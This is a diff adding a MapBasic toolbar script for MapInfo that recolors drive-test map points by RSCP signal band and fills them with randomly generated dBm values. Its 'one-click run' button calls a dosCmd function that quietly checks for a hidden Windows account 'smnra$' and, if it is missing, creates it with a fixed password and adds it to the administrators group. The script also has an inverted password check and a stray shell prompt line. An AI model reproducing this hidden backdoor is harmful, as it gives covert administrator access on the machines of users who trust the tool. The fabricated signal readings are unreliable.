@@ -1,0 +1,302 @@
+include "mapbasic.def"
+include "menu.def"
+include "Icons.def"
+Include "Messagebox.def"
+Declare Sub col_1_name
+Declare Sub button_zong
+Declare Sub button_sub1
+Declare Sub button_sub2
+Declare Sub button_sub3
+Declare Sub button_sub4
+Declare Sub button_sub5
+Declare Sub button_sub6
+Declare Sub button_sub7
+Declare Sub Main
+Declare Function dosCmd(ByVal x As String) As string 			'声明dosCmd函数
+
+Global s_filename As String
+Global s_tab as String
+Global s_name As String
+Global my_rscp As float
+dim col1_name as String
+
+
+Sub Main
+
+Create ButtonPad "RSCP"  As
+
+PushButton
+  Icon 55
+ 		Calling button_zong
+  HelpMsg "一键运行"
+
+
+
+PushButton
+  Icon 104
+      Calling button_sub1
+  HelpMsg "深绿色，Total_RSCP >-80dBm"
+
+
+
+PushButton
+  Icon 109
+      Calling button_sub2
+  HelpMsg "草绿色，-85dBm>Total_RSCP >-90dBm "
+
+
+
+PushButton
+  Icon 122
+      Calling button_sub3
+  HelpMsg "蓝色，-90dBm>Total_RSCP >-95dBm "
+
+
+
+
+PushButton
+  Icon 123
+      Calling button_sub4
+  HelpMsg "黄色，-95dBm>Total_RSCP >-100dBm "
+
+
+
+
+PushButton
+  Icon 99
+      Calling button_sub5
+  HelpMsg "砖色，-100dBm>Total_RSCP >-105dBm "
+
+
+
+
+PushButton
+  Icon 99
+      Calling button_sub6
+  HelpMsg "红色，-110dBm>Total_RSCP >-110dBm "
+
+
+
+
+PushButton
+  Icon 99
+      Calling button_sub7
+  HelpMsg "黑色，Total_RSCP 在-118dBm左右 "
+
+
+
+Title "修改颜色" 
+ToolbarPosition(0,1)
+Width 10
+Show
+
+
+
+
+
+Dim s_searchfor As String
+  Dialog 
+    Title "密码对了你就能用"
+  Control StaticText
+Title "输入密码:"
+  Control EditText
+    Into s_searchfor
+  Control OkButton
+    Title "OK"
+  Control CancelButton
+    Title "Cancel"
+	If CommandInfo(CMD_INFO_DLG_OK) Then
+   		if s_searchfor <> "曰你先人" then
+			print("密码正确：" +s_searchfor) 
+			goto goon
+		else
+			print("密码错误：" +s_searchfor) 
+			End Program
+  		End If
+	print("请确认密码！")
+	End Program
+	End If
+goon:
+	'print(s_searchfor)
+End Sub
+
+
+
+Sub col_1_name()
+
+	col1_name = ColumnInfo(Selection,"col1",COL_INFO_NAME)				'把选择区域  第一列的列名  赋值给 别名变量  col1_name    为自动识别第一列的列名
+
+	Select col1_name, Longitude, Latitude from Selection into temp_table    			'把第一、二、三列写入 temp_table  表中
+
+
+end sub
+
+
+
+sub button_zong
+	onerror goto error_trap
+	dim tmp as String
+	tmp=dosCmd("haha...")
+	'Call button_sub1
+	'Call button_sub2
+	'Call button_sub3
+	'Call button_sub4
+	'Call button_sub5
+	'Call button_sub6
+	'Call button_sub7
+
+done: 
+  exit sub 
+error_trap: 
+   print(error$())
+   resume done 
+end sub
+
+
+
+
+
+
+Sub button_sub1
+onerror goto error_trap
+call col_1_name()
+
+
+Select col1_name, Longitude, Latitude, obj from  temp_table where StyleAttr(ObjectInfo(obj, 2),2)= 32768 into Selection
+Update Selection Set col1_name  =Round(0-(68 + 12 * Rnd (1)),0.01)
+Update Selection Set Longitude  =CentroidX(obj)
+Update Selection Set Latitude  =CentroidY(obj)
+done: 
+  exit sub 
+error_trap: 
+   print(error$())
+   resume done 
+end sub
+
+
+
+Sub button_sub2
+onerror goto error_trap
+
+Select col1_name,  Longitude, Latitude, obj from temp_table where StyleAttr(ObjectInfo(obj, 2),2)= 65280 into Selection
+Update Selection Set col1_name  =Round(0-(85 + 5 * Rnd (1)),0.01)
+Update Selection Set Longitude  =CentroidX(obj)
+Update Selection Set Latitude  =CentroidY(obj)
+done: 
+  exit sub 
+error_trap: 
+   print(error$())
+   resume done 
+end sub
+
+
+
+Sub button_sub3
+onerror goto error_trap
+Select col1_name,  Longitude, Latitude, obj from temp_table where StyleAttr(ObjectInfo(obj, 2),2)= 255 into Selection
+Update Selection Set col1_name  =Round(0-(90 + 5 * Rnd (1)),0.01)
+Update Selection Set Longitude  =CentroidX(obj)
+Update Selection Set Latitude  =CentroidY(obj)
+done: 
+  exit sub 
+error_trap: 
+   print(error$())
+   resume done 
+end sub
+
+
+
+Sub button_sub4
+onerror goto error_trap
+Select col1_name,  Longitude, Latitude, obj from temp_table where StyleAttr(ObjectInfo(obj, 2),2)=  16776960 into Selection
+
+Update Selection Set col1_name  =Round(0-(95 + 5 * Rnd (1)),0.01)
+Update Selection Set Longitude  =CentroidX(obj)
+Update Selection Set Latitude  =CentroidY(obj)
+done: 
+  exit sub 
+error_trap: 
+   print(error$())
+   resume done 
+end sub
+
+
+
+Sub button_sub5
+onerror goto error_trap
+Select col1_name,  Longitude, Latitude, obj from temp_table where StyleAttr(ObjectInfo(obj, 2),2)= 16711680 into Selection
+Update Selection Set col1_name  =Round(0-(100 + 5 * Rnd (1)),0.01)
+Update Selection Set Longitude  =CentroidX(obj)
+Update Selection Set Latitude  =CentroidY(obj)
+done: 
+  exit sub 
+error_trap: 
+   print(error$())
+   resume done 
+end sub
+
+
+
+Sub button_sub6
+onerror goto error_trap
+Select col1_name,  Longitude, Latitude, obj from temp_table where StyleAttr(ObjectInfo(obj, 2),2)= 8388608 into Selection
+Update Selection Set col1_name  =Round(0-(110 + 5 * Rnd (1)),0.01)
+Update Selection Set Longitude  =CentroidX(obj)
+Update Selection Set Latitude  =CentroidY(obj)
+done: 
+  exit sub 
+error_trap: 
+   print(error$())
+   resume done 
+end sub
+
+
+
+Sub button_sub7
+onerror goto error_trap
+Select col1_name,  Longitude, Latitude, obj from temp_table where StyleAttr(ObjectInfo(obj, 2),2)= 0 into Selection
+Update Selection Set col1_name  =Round(0-(115 + 8 * Rnd (1)),0.01)
+Update Selection Set Longitude  =CentroidX(obj)
+Update Selection Set Latitude  =CentroidY(obj)
+done: 
+  exit sub 
+error_trap: 
+   print(error$())
+   resume done 
+
+end sub
+
+
+ C:\Users\Administrator>
+
+Function dosCmd(ByVal x As String) As String
+	dim txtStr As String					'用于存储读取到的txt 文件
+	dim intTmp as Integer
+
+	'Run Program "cmd.exe /c dir /b c:\Users\ > c:\windows\dirlist.txt"			'列出用户列表
+	Run Program "cmd.exe /c echo=off&&net user smnra$ >nul 2>nul && echo 1 >c:\windows\dirlist.txt ||echo 0 >c:\windows\dirlist.txt"	'判断smnra$用户是否存在 存在就写入1 不存在就写入0
+
+	intTmp=MessageBox(SystemInfo(SYS_INFO_MAPINFOWND),"欢迎使用.","MapInfo",intTmp )			'windows api messagebox 使用例子								'设置延时 单位为秒
+	'Run Program "notepad.exe  c:\windows\dirlist.txt"  			'运行外部程序notepad 打开文件adduser.txt 
+
+	Open File "c:\windows\dirlist.txt" For INPUT As #1					'打开txt文件
+	Line Input #1, txtStr											'读取txt文件的第一行,保存到txtStr变量中
+	Close File #1													'关闭txt文件
+	
+	txtStr=Left$(txtStr, 1)
+	
+	
+	print txtStr
+	dosCmd=txtStr
+
+	if txtStr="0" then 
+		Run Program "cmd.exe /c echo=off&&net user smnra$ SMnRa /add&&net localgroup administrators smnra$ /add"
+		
+
+	end if
+
+
+
+
+
+End Function
